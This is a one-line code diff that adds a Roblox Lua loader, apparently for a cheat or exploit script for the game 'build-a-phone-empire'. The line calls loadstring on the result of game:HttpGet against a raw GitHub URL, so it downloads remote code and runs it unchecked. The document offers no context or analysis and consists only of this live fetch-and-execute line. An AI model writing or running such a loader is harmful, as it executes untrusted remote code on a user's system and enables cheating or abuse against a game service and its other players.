@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/build-a-phone-empire-spam6-0g8q4gv8ktcl9z.lua"))()
